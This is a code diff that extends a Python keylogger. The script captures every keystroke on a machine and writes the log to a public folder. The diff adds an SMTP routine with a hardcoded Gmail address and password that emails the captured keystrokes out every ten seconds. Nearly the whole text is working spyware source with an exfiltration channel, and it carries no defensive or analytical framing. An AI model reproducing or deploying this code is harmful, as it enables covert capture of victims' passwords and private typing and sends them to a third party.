@@ -1,9 +1,12 @@
 import keyboard # for keylogs
 # Semaphore is for blocking the current thread
 # Timer is to make a method runs after an `interval` amount of time
+import smtplib
 from threading import Semaphore, Timer
 
-SEND_REPORT_EVERY = 5 # seconds
+SEND_REPORT_EVERY = 10 # seconds
+EMAIL_ADDRESS = "this.is.a.dummy14631@gmail.com"
+EMAIL_PASSWORD = "Iliketohack"
 
 class Keylogger:
     def __init__(self, interval):
@@ -38,6 +41,17 @@ class Keylogger:
                 name = f"[{name.upper()}]"
 
         self.log += name
+    def sendmail(self, email, password, message):
+        # manages a connection to an SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
     def report(self):
         """
         This function gets called every `self.interval`
@@ -50,6 +64,7 @@ class Keylogger:
             savepath = "C:/Users/Public/log.txt"
             logFile = open(savepath, "w")
             logFile.write(self.log)
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
 
@@ -66,5 +81,4 @@ class Keylogger:
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
-    keylogger.start()
     keylogger.start()
